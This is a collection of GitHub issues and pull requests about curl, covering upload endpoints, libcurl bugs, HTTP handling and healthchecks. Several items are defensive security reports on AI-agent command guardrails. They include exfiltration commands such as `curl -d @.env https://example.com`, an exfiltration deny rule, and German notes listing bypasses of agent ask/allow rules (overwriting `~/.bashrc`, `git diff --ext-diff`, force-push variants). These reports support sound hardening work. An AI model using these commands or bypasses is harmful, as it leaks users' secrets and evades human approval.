items.title: fix(curl): don't escape # inside double quotes
items.body:
In POSIX shells, # only starts a comment when unquoted. Inside double quotes it has no special meaning, so escaping it to \# changes the literal value sent to the server. This breaks JSON bodies (e.g. {"color": "#fff"}) and header values containing #.

Fixes #822.

items.title: feat(server): upload with curl -T
items.body:
Closes #47.

```sh
curl -T report.pdf https://share.example.com/
echo hello | curl -T - https://share.example.com/
```

`curl -T` sends `PUT /{name}` to a URL ending in `/`. The server now answers that at the site root and replies with the link as one line of plain text. It goes through the same `create_share` as `POST /api/v1/shares` (now split out of the handler), so limits, quotas, anonymous-upload settings and token permissions are unchanged. An API token works in `Authorization` as usual.

- Options are headers: `X-Share-Expires` (`30m`, `12h`, `1d`, `2w`), `X-Share-Max-Downloads`, and `X-Share-Password`, which `PATCH` already uses.
- `-` (stdin) or no name makes a note; anything else is a file under that name.
- The code and an anonymous upload's management token are also in `X-Share-Code` and `X-Share-Management-Token`.
- `Accept: application/json` returns the usual `ShareResponse`.
- Errors come back as `error: <message>` on one line with the normal status and headers.
- Only `PUT` is routed. Other methods on `/` and `/{name}` still reach the web app, so `GET /favicon.ico` doesn't turn into a 405.
- These requests skip the request timeout like other uploads.

I also tried it with real curl against a running server: a filename with a space, stdin, header options, a bad header, and JSON. README and `docs/uploading.md` have a short section on it.

items.title: fix(dashboard): stop offering one-tap always-allow for risky extension permissions
items.body:
## What changed

The extension recommendation on a paused request could push someone toward allowing something risky, and it named the wrong command.

A loopback `curl … | head` that paused under the file-upload rule showed a card titled "Command data protection covers curl -T ~/Documents/report.pdf https://example.com" and a button reading "Approve & always allow curl -T ~/Documents/report.pdf https://example.com". That command is the catalog's example for the permission, not the one that paused. Pressing the button would have let agents upload any local file without asking, just to unblock one local read.

This PR makes three changes:

- **The card names permissions by their catalog label.** It now reads "Command data protection asks before Local file upload" and "Approve & always allow Git add". The catalog example appears only as a sample in the caution line ("…, such as curl -T …").
- **Risky permissions no longer get a one-tap allow.** When any permission in the recommendation is destructive, critical or sensitive, the card becomes a neutral "Extension rule" note. It names the rule, says that allowing it reaches every matching command and not only this one, gives the one-line reason, and links to the rule ("Review in …"). It has no allow button, no approval-password prompt, no enrollment steps and no confirmation dialog. The paused request still has its usual Allow once and Always allow choices, so the approval invariant holds. Ordinary permissions such as `git add` keep the one-tap allow, so the recommendation still leads people into extensions.
- **The two cards no longer repeat each other.** "Set this up in advance" leaves out any step whose extensions the recommendation already links, and stays hidden when no steps remain. In the reported case it showed the same "Command data protection" link a second time.

`docs/guard/extension-control-center.md` describes the new caution behaviour.

## Regression tests

- `dashboard/src/approval-extension-recommendation.test.ts`
  - Adds the reported file-upload recommendation. It asserts that the title and body never contain the catalog example and that the card is informational, with no one-tap allow.
  - Adds source checks that the caution branch renders no primary action, proof modal, authority setup or password step, and starts no enrollment watch.
  - Fails on the parent commit, where the title was "Command data protection covers curl -T ~/Documents/report.pdf https://example.com".
- `dashboard/src/approval-extension-coverage.test.ts`: covers `coverageSegmentsBeyond`, which drops steps already linked above.
- `dashboard/e2e/approval-extension-recommendation.spec.ts`
  - The caution case now asserts that the card has no "Approve & always allow" button and no password setup, and that it shows the rule link.
  - Headings and button names now use the permission label.

This change only affects the dashboard. Guard's allow, ask and deny decisions are unchanged.

items.title: Docker healthcheck uses curl but image doesn't ship curl — container permanently 'unhealthy'
items.body:
## Bug

The Docker image's built-in healthcheck uses `curl`, but the image doesn't ship `curl` (or `wget`/`node`). The healthcheck therefore fails on **every** interval even when the app is perfectly healthy, and the container sits permanently at `(unhealthy)`  1000+ consecutive failed checks in my case.

## Impact

- False `unhealthy` status in `docker ps`.
- Any watchdog/auto-restart tool keyed on container health (autoheal, watchtower healthcheck mode, etc.) will bounce a perfectly healthy container on a loop.

## Reproduction

```bash
docker inspect chaptarr --format '{{json .Config.Healthcheck}}'
# {"Test":["CMD-SHELL","curl -sf -o /dev/null http://localhost:8789/ping || exit 1"],...}

docker exec chaptarr sh -c 'command -v curl wget node'
# (nothing — none installed)

# from the host, the app itself is fine:
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8789/ping
# 200
```

Version: chaptarr/chaptarr:latest (0.9.911.0, branch develop, build 2026-08-08).

## Suggested fix

The image does include `bash`, so a dependency-free check works:

```yaml
healthcheck:
  test: ["CMD", "bash", "-c", "echo > /dev/tcp/localhost/8789"]
```

(or install curl in the image, or use the actual healthcheck endpoint via a tool that's present).

Workaround applied on my side: compose-level healthcheck override with the bash /dev/tcp form — container reports `healthy` on the first cycle.

items.body:
## Summary

\`http.bas\` currently has no visibility into transfer progress — the queue just fires and forgets. For large downloads (self-update binary, asset packs) the game would appear frozen with no indication of how far along the transfer is.

## What's needed

- Wire up \`CURLOPT_XFERINFOFUNCTION\` (or \`CURLOPT_PROGRESSFUNCTION\` for older curl) in \`curl_qb64.h\` to capture bytes-downloaded / total bytes during a transfer.
- Expose the current in-flight transfer's progress via \`Dim Shared\` in \`http.bas\`:
  - \`httpXferDone As Long\` — bytes received so far
  - \`httpXferTotal As Long\` — content-length (0 if server doesn't send it)
- Game code can read these each frame from the pump loop to draw a progress bar without any blocking.
- \`HTTP_Pump\` resets both to 0 when it clears the completed transfer.

## Notes

- \`CURLOPT_XFERINFOFUNCTION\` requires \`curl_easy_setopt(easy, CURLOPT_NOPROGRESS, 0L)\` to be set — currently the easy handle leaves this at default (1 = disabled).
- The C callback signature is \`int fn(void*, curl_off_t, curl_off_t, curl_off_t, curl_off_t)\` — needs a \`static\` trampoline in \`curl_qb64.h\` that writes to a static counter pair, same stable-buffer pattern as the existing write callbacks.
- Only one transfer is in-flight at a time (queue serialises), so a single pair of shared counters is sufficient.

## Dependents

- #177 (self-update) depends on this for its download progress bar.

items.title: runner: check the HTTP status in the polling backchannel
items.body:
`PollingBackchannel` never looks at the HTTP status. A worker that has no run yet answers `/log-id` with `404 no run in progress`; that text is taken as a run id, so the watchdog ends a freshly assigned run at its first check. A busy worker answers `/kill` with `501` and keeps building, but `kill` returns `Ok(())`.

Runner on `main` with `--run-timeout 3`, and a worker that answers every request with `404 no run in progress`:

```
$ date -u +%T; curl -s -H 'Content-Type: application/json' -d '{"worker": "worker-1", "backchannel": {"kind": "http", "url": "http://localhost:19836/"}}' http://localhost:19831/active-runs | jq -c '{id, codebase}'
20:12:48
{"id":"c70ddbb4-cf85-4be4-8bcf-c166cc404682","codebase":"hello"}
$ date -u +%T; curl -s http://localhost:19831/active-runs | jq length
20:13:08
1
$ date -u +%T; curl -s http://localhost:19831/active-runs | jq length
20:13:28
0
...
$ cat fake-worker.log
20:13:17 GET /status
20:13:17 GET /log-id
20:13:17 POST /terminate
20:13:17 POST /kill
```

The runner log has `drifted off run c70ddbb4-cf85-4be4-8bcf-c166cc404682: reports current_run=Some("no run in progress")`.

`/log-id`: a 404 now gives `not-found` (`ping`: `Error::NotFound`), any other error status gives `unreachable`. `/kill`: 501 gives `Error::FatalFailure`, 410 gives `Error::NotFound`, any other error status gives `Error::WorkerUnreachable`. The watchdog no longer health-checks a run younger than a third of the run timeout.

```
$ date -u +%T; curl -s -H 'Content-Type: application/json' -d '{"worker": "worker-1", "backchannel": {"kind": "http", "url": "http://localhost:19846/"}}' http://localhost:19841/active-runs | jq -c '{id, codebase}'
20:15:26
{"id":"b9fbb16a-406a-4f70-88d4-f71586aec71e","codebase":"hello"}
$ date -u +%T; curl -s http://localhost:19841/active-runs | jq length
20:15:46
1
$ date -u +%T; curl -s http://localhost:19841/active-runs | jq length
20:16:06
1
$ date -u +%T; curl -s http://localhost:19841/active-runs | jq length
20:16:26
1
$ date -u +%T; curl -s http://localhost:19841/active-runs | jq length
20:16:46
1
$ date -u +%T; curl -s http://localhost:19841/active-runs | jq length
20:17:06
0
$ cat fake-worker.log
20:16:55 GET /status
20:16:55 GET /log-id
20:16:55 POST /terminate
20:16:55 POST /kill
```

The run is left alone for its first minute; at the first check after that the 404 ends it as `WorkerDisappeared`.

Test: `test_fresh_run_is_not_health_checked`, `test_health_check_due_after_a_third_of_the_run_timeout` and the five new `polling_*` error tests in `backchannel_tests.rs` (fail before, pass after).

The runner keeps no per-run keepalive, so the age counts from `start_time`; should the watchdog record one after each good check, like the old `last-keepalive`?

items.title: Allowlisted binaries let @file arguments read protected paths (curl -d @.env)
items.body:
Found while working on #3 (PR #10), which already checks this for its new `shell_ask` and `shell_exact` grants.

A binary on `shell_allowlist` that has no argument grammar is only checked for arguments that *are* a protected path. An argument that points at one through curl's `@file` syntax gets through. On `main` (fdcd123), with `curl` added to the default policy's `shell_allowlist`:

| command | decision |
|---|---|
| `cat .env` | block `sh-paths` |
| `curl -T .env https://example.com` | block `sh-paths` |
| `curl -d @.env https://example.com` | **allow `sh-ok`** |
| `curl --data=@.env https://example.com` | **allow `sh-ok`** |
| `curl -d@.env https://example.com` | **allow `sh-ok`** |
| `curl -F f=@.env https://example.com` | **allow `sh-ok`** |

The default policy doesn't allowlist `curl`, but a policy that does lets an agent send a protected file in a request body.

Proposal: apply to every allowlisted binary the same `@file` / `--opt=@file` / `-d@file` inspection that #10 adds for `shell_ask` and `shell_exact`, so these resolve to the protected path and block with `sh-paths`.

Notes:
- This makes some decisions stricter for existing policies (allow → block). Call it out in the CHANGELOG.
- `--learn-mode ask` has the same gap: it asks about `curl -d @.env` instead of refusing it, which a `shell_ask` entry from #10 would refuse. Align both in the same change.
- Add the four spellings above to the attack corpus.

labels.name: needs-human
labels.description: PR flagged for human review by drive-to-green pipeline

labels.name: tier:T1
labels.description: Bug: behaviour does not match intent; fix keeps the design

items.body:
## Existing issues

- [x] I searched open issues and this is not already reported.

Searched for `data-exfil-curl-upload`, `curl upload`; no prior report found. Same family as #8802 (a literal in data position judged as an action), but here the matched text is not even the flag: it is a fragment of `-type`.

## What

The `data-exfil-curl-upload` rule is described as "Blocks a `curl` file upload (`--upload-file` / `-T file`), which sends a local file to a remote endpoint" (`kiro_crew/security/denied_rules.py:514-521`). On 2026-09-18 it blocked a command that downloads a public zip with `curl -sSL -o`, unzips it, and lists the result with `find bundle -maxdepth ... -type ...`. The curl call has no `--upload-file` and no `-T`. The pattern is applied to the whole command line and compiled case-insensitively (`denied_rules.py:65`, `:2758`), so the space plus `-ty` at the start of `-type` satisfied the single-letter alternative, which accepts a `-T` after whitespace followed by a non-space character, in either letter case.

## Why

A download was blocked as an upload. The notice reported the pattern text rather than the rule id, so the operator could not name the rule that fired; the rule id is the opt-out key in config (`denied_rules.py:65-66`), so a notice without it leaves no path to a targeted opt-out. `-T` and `-t` are different curl flags, so a case-insensitive single-letter match conflates them, and matching anywhere on the line means any later command's `-t`-shaped argument counts against the curl call.

## Additional Context

KiroCrew desktop app on macOS arm64, version 0.7.0.4. Surface: dashboard chat session, the agent's shell tool. Event 19, 2026-09-18T07:46:21Z. The notice reported the pattern text, not the rule id. The 2026-09-19 to 2026-09-21 tally (dashboard transcripts, not adjudicated) lists no further fire of this rule.

Command that was blocked (event 19, redacted to shape, `...` marks a cut):

```text
S="${KIROCREW_SCRATCH:-$TMPDIR}/google-siwg"; mkdir -p "$S" && cd "$S" && curl -sSL -o signin-assets.zip "https://developers.google.com/static/identity/images/signin-assets.zip" && ls -la signin-assets.zip && unzip -q -o signin-assets.zip -d bundle && echo "--- top-level" && find bundle -maxdepth ... -type ...
```

Checked in source (0.7.0.5 payload; 0.7.0.4 identical where checked):

- `kiro_crew/security/denied_rules.py:514-521`: rule id, pattern and description. The pattern requires `curl` somewhere on the line and then, anywhere later on the line, either `--upload-file` or a `-T` preceded by start-of-line or whitespace and followed by a non-space character.
- `kiro_crew/security/denied_rules.py:65` and `:2758`: catalog patterns are matched with `re.search` and compiled with `re.IGNORECASE`.

Not established: the rule was not replayed against the command. The reading above is of the pattern text against the redacted command text.

Ask:

1. Match `-T`/`--upload-file` as an argument token of the `curl` invocation itself, not anywhere on the command line.
2. Make the single-letter flag match case-sensitive (`-T` and `-t` are different curl flags).
3. Report `rule=data-exfil-curl-upload` in the notice.

items.title: Search index drops the duration, track, disc and year of audio files
items.body:
The search service's Tika content extractor drops most audio metadata because it parses values as plain integers, while Tika reports them in other formats:

- `xmpDM:duration` is in seconds with a fractional part, so the duration is never indexed.
- `xmpDM:trackNumber` and `xmpDM:discNumber` of mp3 files are `number/total`, so the track and disc are not indexed.
- `xmpDM:releaseDate` can be a full date, so the year is not indexed.

The code is in `getAudio` in `services/search/pkg/content/tika.go`, which uses `strconv.ParseInt` for these fields.

## Steps to reproduce

1. Start Tika 3.2.2, the version the acceptance tests use: `docker run -d -p 9998:9998 apache/tika:3.2.2.0-full`.
2. Create test files:
   ```
   ffmpeg -f lavfi -i "sine=duration=3" -metadata track=7/12 -metadata disc=1/2 t.mp3
   ffmpeg -f lavfi -i "sine=duration=3" -metadata date=2004-05-12 t.m4a
   ```
3. Send them to Tika: `curl -T t.mp3 -H "Accept: application/json" localhost:9998/meta`.

Tika returns:

| File | Field | Value |
|---|---|---|
| mp3 | `xmpDM:duration` | `"3.0563297271728516"` |
| mp3 | `xmpDM:trackNumber` | `"7/12"` |
| mp3 | `xmpDM:discNumber` | `"1/2"` |
| m4a | `xmpDM:duration` | `"3.0"` |
| m4a | `xmpDM:releaseDate` | `"2004-05-12"` |

4. Upload the same files to oCIS with `SEARCH_EXTRACTOR_TYPE=tika` and search for them. The `audio` facet has no `duration`, `track`, `disc` or `year`.

## Expected behavior

The `audio` facet contains the duration in milliseconds, plus the track number, disc number and release year.

## Actual behavior

These fields are missing. The existing unit test passes only because its mocked Tika response uses `"xmpDM:duration": "225"` and `"xmpDM:releaseDate": "2004"`, which real Tika does not produce for these files.

## Setup

oCIS master, search service with the Tika extractor, Tika 3.2.2.

items.title: [High] WebDAV PUT sent chunked (Content-Length header ignored); oCIS rejects every upload with 400
items.body:
**Environment:** `main` @ b3cd6c1, oCIS (`owncloud/ocis:latest`, basic auth enabled, plain HTTP), explicit FTPS via curl/lftp/Python ftplib, found during a manual test pass.

## Problem
Every upload to oCIS fails: the WebDAV PUT is sent chunked and oCIS returns **400**; the FTP client gets 550. oCIS logs `strconv.ParseInt: parsing "": invalid syntax` in ocdav. A direct `curl -T file` (with Content-Length) returns 201, and `curl -H 'Transfer-Encoding: chunked'` returns 400.

## Cause
`doUpload` (`pkg/webdav/client.go`) sets `req.Header.Set("Content-Length", ...)`. Go's HTTP transport ignores that header; `req.ContentLength` must be set. With an `*os.File` body it is 0/unknown, so the request is chunked. A zero-byte upload (`size == 0`) also needs `ContentLength = 0` with a non-nil empty body.

## Expected
PUT is sent with a correct Content-Length (set `req.ContentLength = size`).

## Notes
The e2e mock accepts chunked bodies, so tests don't catch this (see #80).

items.title: SIGSEGV in cb_multi_socket with libcurl 8.23: curl_easy_getinfo() fails on internal handles, 'easy' left uninitialized
items.body:
Hello,
I had crashes since I installed libcurl 8.23.0, so I used Claude AI to analyze the problem.
The suggested solution works on my system.
This is the description from Claude AI:

with libcurl 8.23.0, Net::Curl 0.59 crashes in `cb_multi_socket()` as soon as a
`CURLMOPT_SOCKETFUNCTION` is set and `perform()` is called. This affects every
`LWP::Protocol::Net::Curl` user, because it installs
`CURLMOPT_SOCKETFUNCTION => sub { 0 }`. `t/60-multi-wait.t` crashes too (it looks
like a hang under `make test`, because the forked Test::HTTP::Server child
survives).

```
Program received signal SIGSEGV, Segmentation fault.
cb_multi_socket (easy_handle=0x449b60, s=4, what=1, userptr=0x434910, socketp=0x0)
    at curl-Multi-c.inc:79
79              easy_sv = SELF2PERL( easy );
(gdb) p easy
$1 = (perl_curl_easy_t *) 0x80
#1  mev_sh_entry_update.part () from libcurl.so.4
#2  mev_assess.part () from libcurl.so.4
#3  multi_runsingle () from libcurl.so.4
#4  multi_perform () from libcurl.so.4
#5  curl_multi_perform () from libcurl.so.4
```

Cause: libcurl 8.23 ("lib: reject internal handles in the multi/easy public
API") now passes sockets of its *internal* easy handles (e.g. the multi admin
handle) to the socket callback, and `curl_easy_getinfo()` on such a handle
returns `CURLE_BAD_FUNCTION_ARGUMENT` without writing the output
(`Curl_eapi_enter()` checks `data->state.internal`). `easy` is not initialized
and the return code is ignored, so the NULL check added in #87 does not help:
`SELF2PERL()` gets stack garbage.

Fix: initialize `easy` and check the return code (`$easy` is undef for such
handles). The same pattern exists in `info_read()`, where I skip messages
for handles that are not ours:

```c
-	perl_curl_easy_t *easy;
+	perl_curl_easy_t *easy = NULL;
 ...
-	(void) curl_easy_getinfo( easy_handle, CURLINFO_PRIVATE, (void *

[Net-Curl-0.59-internal-handles-fix.patch](https://github.com/user-attachments/files/33438027/Net-Curl-0.59-internal-handles-fix.patch)

) &easy );
+	if ( curl_easy_getinfo( easy_handle, CURLINFO_PRIVATE, (void *) &easy ) != CURLE_OK )
+		easy = NULL;
```

With this, the full test suite passes against libcurl 8.23.0 (68 files, 4903
tests), and the LWP::Protocol::Net::Curl based tools that crashed work again.

Environment: libcurl 8.23.0 (OpenSSL/3.5.9), Perl 5.40.0, Net::Curl 0.59, Linux 5.14 (SLES15 family).

items.title: Image upload
items.body:
Adds a setting for the software image folder, HTTP upload into it, and a core image list, so any application, not only fleetmgr, can store and list images. The setting is `software.image_dir` (`--software.image-dir`). 

`PUT /image-file/<name>` saves the request body as that file, replacing one of that name, e.g. `curl -T x.bin http://top:18200/image-file/x.bin`. `GET /image-file` lists the folder and `DELETE` removes a file. The `stratoweave-images` module adds `/images/image`, keyed by the file name, with optional `os`, `version` and `model`, e.g. `c8000v-universalk9.17.18.03a.SPA.bin` with `IOS XE`, `17.18.03a` and `C8000V`. An application adds `swyang.images` to its top layer, as mini now does.

items.title: Room file transfers report success to the sender but never raise an approval card
items.body:
## What happens
A session sends a file into an agent chat room with `send_attachment` + `chat_room_id`. The sender sees success, and the room shows `[sent image "…" (blob …)]`, but:
- the user never gets an approval card, neither in the room nor in For you;
- the receiving session never gets the file in its inbox;
- the Coordinator's `consent_list` shows no pending transfer for it;
- in one case, the tracker item that had been created for the card later returned "not found".

## Seen
On 2026-10-26 and 2026-10-27, between a Mac box and a Linux dev box, in a room between two of the same user's sessions. It happened three times in a row:
- one 17 MB PNG;
- then a batch of four JPGs (2.7–7.4 MB);
- then the same four resent.

Typing "approve all cards" in the room does nothing, because there are no cards to approve.

In the same period, one older transfer in another room did still show as pending in `consent_list`, so the card mechanism is not failing everywhere.

## Expected
Either a card appears for every transfer the sender is told succeeded, or the sender is told the transfer failed.

## Workaround used
A temporary upload-only HTTP endpoint on the receiving box, protected by a random token in the path, with the sender pushing via `curl -T`.

items.title: Fix curl_getinfo() CURLINFO_OFF_T truncating to native long
items.body:
The array mode of curl_getinfo() casts curl_off_t values to zend_long (the CAAL macro), always 64 bits on a 64-bit build. The single-option mode used a plain (long) cast instead, which is 32 bits on Win64 (LLP64), so curl_getinfo($ch, CURLINFO_TOTAL_TIME_T) could silently truncate a value curl_getinfo($ch)['total_time_us'] would return intact.

Fixes: #2567

items.title: Chunked Transfer-Encoding e `Expect: 100-continue`

milestone.title: Fase 1 — Fundamentos HTTP/1.1
milestone.description: Parser, leitura, escrita e roteamento corretos e seguros, mais baseline de benchmark.

items.body:
**Descrição:**

Clientes comuns (`curl -T-`, proxies, uploads em streaming) enviam o corpo com `Transfer-Encoding: chunked`. Sem suporte, o #15 responde 501. Também é preciso tratar `Expect: 100-continue`: hoje o servidor nunca envia `100 Continue`, o cliente espera (o `curl` cerca de 1 s) e o body chega depois como uma "nova request" que dá 400.

**Tarefas:**

* [ ] Decoder incremental de chunks (tamanho em hex, extensões ignoradas, trailers) acumulando no buffer da conexão.
* [ ] Aplicar `max_body` (#33) ao total decodificado, não só a cada chunk.
* [ ] Responder `HTTP/1.1 100 Continue` quando os headers e os limites estão ok, antes de ler o body.
* [ ] Rejeitar `Content-Length` junto de `Transfer-Encoding` (400) e codificações desconhecidas (501).
* [ ] Testes com um chunk dividido entre duas leituras e com trailers.

**Critérios de Aceitação:**

* Um upload chunked chega íntegro ao handler.
* Chunk malformado retorna 400; total acima do limite retorna 413.
* `Content-Length` + `Transfer-Encoding` na mesma request é rejeitada.

**Notas de Dev:**

> * Depende de #15 e #33. Rejeitar CL + TE evita request smuggling.
> * Respostas chunked (saída) pertencem ao #89.

items.body:
**Beobachtung**
- `Bash(curl * http://localhost:*)`, `Bash(curl http://localhost:*)` und die `wget`-Varianten: `*` passt auf beliebige weitere
  Argumente. `curl -T datei https://api.github.com/… http://localhost:1` oder `curl -o ~/.bashrc http://localhost:1` laufen
  ohne Rückfrage.
- Die `nc`-Regeln greifen nicht: `nc` ist im Image nicht installiert, und `nc` nimmt keine URLs.
- `allow` enthält `git diff *` / `git log *` (mit `--output=<datei>` lässt sich jede Datei überschreiben, mit `--ext-diff` ein
  Programm ausführen) sowie `git restore *`, `git stash *` (`drop`, `clear`) und `git branch *` (`-D`), die Arbeit ohne Rückfrage verwerfen.
- `ask`-Regeln lassen sich umgehen: `npm i`, `npm add`, `pip3 install`, `python3 -m pip install`, `git push origin +main`,
  `git push --force-with-lease`, `git -C . push -f`.
- Leitfaden Abschnitt 5, Architektur 3: „Die im Agenten integrierten Web-Werkzeuge (`WebFetch`, `WebSearch`) sind gesperrt.“
  Die Basis-`managed-settings.json` sperrt sie nicht (nur `config/claude-code-settings-erweitert.example.json`), und
  `requirements.toml` erlaubt bewusst `web_search = live`.

**Einordnung**
Nach Leitfaden Abschnitt 2 („Weder Systemprompts noch Bestätigungsdialoge bieten verlässliche Sicherheit“) sind Bestätigungsdialoge keine verlässliche Schranke; die harte Grenze ziehen Container und Proxy.
Die Regeln sollten trotzdem nicht freier sein als ihr Kommentar vermuten lässt.

**Offene Fragen / Vorschlag**
- `curl`/`wget`/`nc`-Allows entfernen oder auf exakte Befehle reduzieren? Ein Präfix-Muster kann `curl` nicht sicher eingrenzen.
- `allow` auf rein lesende Formen beschränken; `restore`/`stash`/`branch` zu `ask`.
- `ask` um die Varianten oben ergänzen, mit dem Hinweis, dass die Liste nie vollständig ist.

items.title: ws: validate fragsize and frame parameters
items.body:
In \curl_ws_send()\, when sending a partial frame with \CURLWS_OFFSET\, \ ragsize\ specifies the total frame payload length. If \ ragsize\ is negative or smaller than \ uflen\, \ws_enc_send()\ previously started the frame with the smaller \ ragsize\, encoded the initial partial payload, and exhausted \enc->payload_remain\ prematurely. On the subsequent call, \ws_enc_send()\ mistook the continuation for a brand new frame and emitted an unwanted frame header in the middle of the payload stream.

Additionally:
- Reject negative \payload_len\ in \ws_enc_add_frame()\ with \CURLE_BAD_FUNCTION_ARGUMENT\ instead of \CURLE_SEND_ERROR\, as it represents invalid input rather than a network transmission failure.
- In \curl_ws_send()\, reject \ uflen\ exceeding \CURL_OFF_T_MAX\.
- In \curl_ws_start_frame()\, reject negative \ rame_len\ and \CURLWS_OFFSET\ (which is only applicable to \curl_ws_send\) with \CURLE_BAD_FUNCTION_ARGUMENT\.
- Add regression test coverage in \lib2700\.

items.title: fix: replay detection-prefix bytes past a short NSP header
items.body:
## Summary
- `/install` rejected valid NSPs with `write meta nca failed (0x1759)` whenever the PFS0 header was shorter than the 0x1104-byte detection prefix, which covers most small NSPs. `install_nsp` drained only the header bytes from the prefix and dropped the rest, so every entry was read from the wrong offset and the meta NCA failed its SHA-256 check. Fixes #31.
- The leftover prefix bytes are now replayed ahead of the stream through `install_prefix_read`, a small pure `InstallReadFn` wrapper declared in `install.h` that builds on the host.

## Verification
- **Before (1.5.0 release):** `curl -T "Gunman Tales [0100D5B017C82000][v0].nsp" .../install` returned `{"ok":false,"error":"write meta nca failed (0x1759)"}`, and the log showed `hash mismatch for content (size=3584)`.
- **After (this branch built with devkitpro/devkita64, deployed over `/files`, then `/power/restart`):**
  - Gunman Tales: `{"ok":true,"titleId":"0100d5b017c82000",...}` in about 14 s.
  - Steel Defier (PFS0 header 400 bytes): `{"ok":true,"titleId":"010022f01a270000",...}`.
  - Both appear in `GET /titles`.
- **Console:** Mariko, HOS 22.5.0, Atmosphère 1.11.2, emuMMC.
- **Host tests:** `test_install` gains `test_prefix_reader`. It simulates a 0x1104-byte sniff with a 0x100-byte header and short (0x333-byte) stream reads, and asserts the bytes come out in order with nothing dropped, plus an empty-prefix passthrough. `./tests/run.sh` passes.

## Notes
- XCI is unaffected: `install_xci` already drains the prefix with `skip_to(root_off)`, and `root_off` ≥ 0xF000.
- Includes a patch changeset.

items.title: Classic server: HEAD omits Content-Length
items.body:
`GET` on a document returns `Content-Length`, but `HEAD` on the same document doesn't:

```sh
curl -I -H "Authorization: Bearer $T" "$ROOT/t/x.txt"   # Content-Type and ETag only
```

`lib/controllers/storage.js` L71 skips the header for HEAD: `if (item && item.value && !head)`. The size is already in the item's metadata, and HEAD should return the same headers as GET (RFC 9110 §9.3.2). Clients use it to get a size without downloading the document.

items.title: Pointer size fixes for LLP64 (64-bit Windows)
items.body:
Pointer size fixes for LLP64 platforms (64-bit Windows: `long` is 32 bit, pointers are 64 bit). One fix per commit; no behaviour change on LP64 (Linux, macOS, BSDs), where `long`, `gulong` and pointers have the same size.

### Changes

- **timeutils: don't truncate pointers in `__UNCONST()`.** `wallclocktime.c` cast pointers through `unsigned long`, so `wall_clock_time_strptime()` returned a truncated pointer and its callers (all date parsers) crashed. The macro now uses `uintptr_t` (`<stdint.h>` is already included).
- **string-list: don't truncate pointers when checking for markers.** `string_list_clone()` and `_free_valid_str_pointers()` distinguish real strings from small marker values (e.g. the SQL `default` item) with `(gulong) ptr > 4096`. With a 32-bit `long`, a valid pointer whose low 32 bits are <= 4096 was treated as a marker: shared instead of duplicated on clone, and leaked on free. The check now uses `guintptr`.
- **logmsg: allow `long` to be shorter than a pointer for inline tags.** Inline tags are stored in the `tags` pointer itself as a bit array of `gulong`; only the first `gulong` is used (`LOGMSG_TAGS_BITS` follows `GLIB_SIZEOF_LONG`). This is valid whenever `long` is not larger than a pointer. The compile-time check required equal sizes and failed on LLP64; it now only rejects `long` larger than a pointer.
- **http: pass the compressed body size to libcurl as `curl_off_t`.** `CURLOPT_POSTFIELDSIZE` takes a `long`, the compressed body length is a `gsize`, wider than `long` on LLP64 (GCC warns there through libcurl's type checks). `CURLOPT_POSTFIELDSIZE_LARGE` with an explicit `curl_off_t` holds any size on every platform.

### Testing

The affected code paths are covered by existing unit tests. On 64-bit Windows `test_conv`, `test_unixtime`, `test_wallclocktime` and `test_date` crash without the `__UNCONST()` fix and pass with it.

items.title: cURL doesn't like spaces in URLs
items.body:
I had trouble today while attempting to download a file from Bunny. The first request (directory list) would succeed, but the second one (file download) would fail with a very non-descriptive error code 3 and no error message whatsoever, without even attempting to connect to the server.

A Google search hinted that error 3 has something to do with malformed URL's, but it took me a while to figure out that the problem was caused by a whitespace character in the file name. This doesn't seem documented anywhere, but I found a [StackOverflow thread](https://stackoverflow.com/questions/5931853/curl-requesting-url-with-whitespaces-in-url-what-to-do) about it.

So, I have two alternative propositions:
1. please fix whitespace handling. A simple `str_replace()` call on the URL does the trick.
2. consider using PSR-18 HTTP client instead of cURL directly. cURL itself is too low level, difficult to debug, doesn't support logging and may even be unavailable. PSR-18 would abstract away this ugly dependency.

items.title: Stage-in curl does not follow redirects: HTTP inputs silently staged as the redirect body

labels.name: tes-compliance
labels.description: GA4GH TES spec conformance / client compatibility

items.body:
Stage-in downloads HTTP(S) FILE inputs with `curl -f -o <file> <url>` (`tesp_api/utils/container.py`, `stage_in_command`). Without `-L`, curl doesn't follow redirects, and `-f` only fails on status 400 and above. So a 3xx response body is saved as the input, curl exits 0, and the executor runs on the wrong data.

Many real input URLs redirect: GitHub raw and releases, Zenodo, DOIs, CDN mirrors, http→https. Found in #36: the smoke tests with HTTP inputs had been passing on redirect pages, because they don't check content.

## Scope
- Follow redirects (`curl -L` with a sane `--max-redirs`), and decide whether a redirect from https to http is allowed.
- Keep `-g` and the quoting from #26, and check that `wget --mirror` stays within the host.
- Make the smoke tests check the content of downloaded HTTP inputs.

## Test first
- A unit test that the stage-in command follows redirects.
- An integration test using a `/redirect/<path>` route in `tests/upload_server.py`.

items.title: std.net.curl doesn't work with -static

type.name: Feature
type.description: A request, idea, or new functionality

items.body:
Compiling an app that uses curl with musl+ldc+alpine results in a single working static (portable!) executable. However, std.net.curl does not work correctly because it attempts to load the dynamic library libcurl.so.

The main reason is that the check at this [line](https://github.com/dlang/phobos/blob/d4a1354f3157deaf9c6494dc3c060b92287959e0/std/net/curl.d#L4221) fails, likely because `dlopen` does not work in static binaries, and thus the symbol is incorrectly not detected. I guess it works with static symbols on dynamic executable?

Incidentally, a simple program using `etc.c.curl` works because the symbols *are* present, as can be confirmed by analyzing the executable file.

Perhaps a different check should be used (e.g., __traits(compiles)?), but the entire structure would then need to be adjusted accordingly.

Linked libs: `"-lcurl", "-lunistring", "-lbrotlicommon", "-lbrotlienc", "-licuuc", "-licudata", "-lcares_static", "-lnghttp2", "-lidn2", "-lpsl", "-lssl", "-lcrypto", "-lzstd", "-lbrotlidec", "-lz"`
